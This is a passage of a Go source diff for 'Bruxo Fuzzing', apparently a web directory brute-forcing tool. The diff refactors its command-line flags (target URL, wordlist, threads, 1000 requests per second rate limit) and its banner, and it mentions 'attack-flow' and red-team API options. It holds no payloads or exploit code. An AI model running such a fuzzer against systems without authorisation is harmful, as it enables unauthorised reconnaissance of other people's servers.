-	showCodes := flag.String("sc", "200,204,301,302,307,403,500", "Status codes to show, comma-separated")
-	filterCodes := flag.String("fc", "404", "Status codes to filter, comma-separated")
-	filterExts := flag.String("fx", "css,js,png,jpg,jpeg,svg,ico,woff,woff2,eot,ttf", "Extensions or keywords to ignore, comma-separated")
-	extensions := flag.String("x", "", "Extensions to add to each wordlist entry (e.g., .php,.html)")
-	flag.IntVar(&config.RateLimit, "rl", 1000, "Requests per second limit")
+	var config Config
+	var showCodes, filterCodes, extensions, filterExtensions string
+
+	flag.StringVar(&config.TargetURL, "u", "", "Target URL (e.g., http://example.com)")
+	flag.StringVar(&config.WordlistPath, "w", "", "Path to the wordlist file")
+	flag.IntVar(&config.NumThreads, "t", 50, "Number of concurrent threads")
+	flag.StringVar(&config.OutputFile, "o", "", "Output file name")
+	flag.StringVar(&config.Format, "f", "html", "Output format (json, html)")
+	flag.StringVar(&showCodes, "sc", "200,204,301,302,307,403", "Show specific status codes (comma-separated)")
+	flag.StringVar(&filterCodes, "fc", "", "Filter specific status codes (comma-separated)")
+	flag.StringVar(&extensions, "e", "", "Append extensions to wordlist entries (e.g., .php,.html)")
+	flag.StringVar(&filterExtensions, "fx", "css,js,png,jpg,jpeg,svg,ico,woff,woff2,eot,ttf", "Filter out specific extensions (comma-separated)")
+	flag.IntVar(&config.RateLimit, "rl", 1000, "Rate limit in requests per second")
 	flag.BoolVar(&config.Verbose, "v", false, "Verbose mode")
 	flag.BoolVar(&config.Debug, "debug", false, "Debug mode")
 	flag.IntVar(&config.Timeout, "timeout", 10, "Request timeout in seconds")
@@ -971,68 +981,55 @@ func main() {
 	flag.BoolVar(&config.EnableAttackFlow, "attack-flow", false, "Enable guided attack flows for found vulnerabilities")
 	flag.StringVar(&config.RedTeamToolURL, "red-team-tool-url", "", "URL of the Red Team tool API for integration")
 
-	// Lê a chave da API da variável de ambiente
-	if config.GroqAPIKey == "" {
-		fmt.Println(ColorYellow + "[WARNING] GROQ_API_KEY environment variable not set. AI analysis will be skipped." + ColorReset)
-	}
-
 	flag.Parse()
 
 	if config.TargetURL == "" || config.WordlistPath == "" {
-		fmt.Println(ColorRed + "Error: The -u (URL) and -w (wordlist) parameters are required." + ColorReset)
+		fmt.Println("Target URL (-u) and wordlist (-w) are required.")
 		flag.Usage()
 		return
 	}
 
-	if *showCodes != "" {
-		for _, codeStr := range strings.Split(*showCodes, ",") {
-			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
-				config.ShowStatusCodes = append(config.ShowStatusCodes, code)
+	if config.GroqAPIKey == "" {
+		fmt.Println(ColorYellow + "[WARNING] GROQ_API_KEY environment variable not set. AI analysis will be skipped." + ColorReset)
+	}
+
+	parseCodes := func(codes string) []int {
+		var result []int
+		if codes != "" {
+			parts := strings.Split(codes, ",")
+			for _, part := range parts {
+				code, err := strconv.Atoi(strings.TrimSpace(part))
+				if err == nil {
+					result = append(result, code)
+				}
 			}
 		}
+		return result
 	}
 
-	if *filterCodes != "" {
-		for _, codeStr := range strings.Split(*filterCodes, ",") {
-			if code, err := strconv.Atoi(strings.TrimSpace(codeStr)); err == nil {
-				config.FilterStatusCodes = append(config.FilterStatusCodes, code)
+	config.ShowStatusCodes = parseCodes(showCodes)
+	config.FilterStatusCodes = parseCodes(filterCodes)
+
+	parseExtensions := func(exts string) []string {
+		var result []string
+		if exts != "" {
+			parts := strings.Split(exts, ",")
+			for _, part := range parts {
+				result = append(result, strings.TrimSpace(part))
 			}
 		}
+		return result
 	}
 
-	if *filterExts != "" {
-		config.FilterExtensions = strings.Split(*filterExts, ",")
-	}
-
-	if *extensions != "" {
-		config.Extensions = strings.Split(*extensions, ",")
-	}
-
-	if config.OutputFile != "" {
-		if strings.HasSuffix(config.OutputFile, ".json") {
-			config.Format = "json"
-		} else if strings.HasSuffix(config.OutputFile, ".html") {
-			config.Format = "html"
-		} else {
-			// If the extension is not recognized, default to json
-			config.Format = "json"
-		}
-	}
+	config.Extensions = parseExtensions(extensions)
+	config.FilterExtensions = parseExtensions(filterExtensions)
 
 	printBanner(config)
-
-	fmt.Printf("%sStarting scan on %s with %d threads...%s\n",
-		ColorGreen, config.TargetURL, config.NumThreads, ColorReset)
-
-	fmt.Println()
-
 	engine := NewBruxoEngine(&config)
 	if err := engine.Scan(); err != nil {
-		engine.logger.Error("Error during scan: %v", err)
+		engine.logger.Error("An error occurred during the scan: %v", err)
 	}
 }
-
-// bruxo.go
 
 func printBanner(config Config) {
 	banner := `
@@ -1043,22 +1040,13 @@ func printBanner(config Config) {
 ██████╦╝██║░░██║╚██████╔╝██╔╝╚██╗╚█████╔╝
 ╚═════╝░╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝░╚════╝░
 `
-	tagline := "       Speed is magic — by Dione, Brazil "
-	version := "          BRUXO FUZZING v1.0"
-
-	fmt.Println(Bold + ColorPurple + banner + ColorReset)
-	fmt.Println(ColorWhite + tagline + ColorReset)
-	fmt.Println(ColorCyan + version + ColorReset)
-	fmt.Println()
-
-	// Configuration Panel
-	fmt.Printf(" %s Target          : %s%s\n", ColorRed+"🚩"+ColorReset, ColorWhite, config.TargetURL)
-	fmt.Printf(" %s Wordlist        : %s%s\n", ColorBlue+"📂"+ColorReset, ColorWhite, config.WordlistPath)
-	fmt.Printf(" %s Threads         : %s%d\n", ColorYellow+"💀"+ColorReset, ColorWhite, config.NumThreads)
-	fmt.Printf(" %s  Rate Limit      : %s%d/s\n", ColorGreen+"⏱️"+ColorReset, ColorWhite, config.RateLimit)
-	fmt.Printf(" %s Filter (-fx)    : %s%v\n", ColorCyan+"👾"+ColorReset, ColorWhite, config.FilterExtensions)
-	if len(config.Extensions) > 0 {
-		fmt.Printf(" %s Extensions (-x) : %s%v\n", ColorYellow+"🧩"+ColorReset, ColorWhite, config.Extensions)
-	}
-	fmt.Println(strings.Repeat("-", 60))
+	fmt.Println(ColorPurple + banner + ColorReset)
+	fmt.Printf("       %sSpeed is magic — by Dione, Brazil%s \n", ColorWhite, ColorReset)
+	fmt.Printf("          %sBRUXO FUZZING v1.0%s\n\n", Bold, ColorReset)
+	fmt.Printf(" %s🚩 Target          : %s%s\n", ColorCyan, ColorReset, config.TargetURL)
+	fmt.Printf(" %s📂 Wordlist        : %s%s\n", ColorCyan, ColorReset, config.WordlistPath)
+	fmt.Printf(" %s💀 Threads         : %s%d\n", ColorCyan, ColorReset, config.NumThreads)
+	fmt.Printf(" %s⏱️  Rate Limit      : %s%d/s\n", ColorCyan, ColorReset, config.RateLimit)
+	fmt.Printf(" %s👾 Filter (-fx)    : %s%v\n", ColorCyan, ColorReset, config.FilterExtensions)
+	fmt.Printf("%s%s%s\n", ColorPurple, strings.Repeat("-", 60), ColorReset)
 }
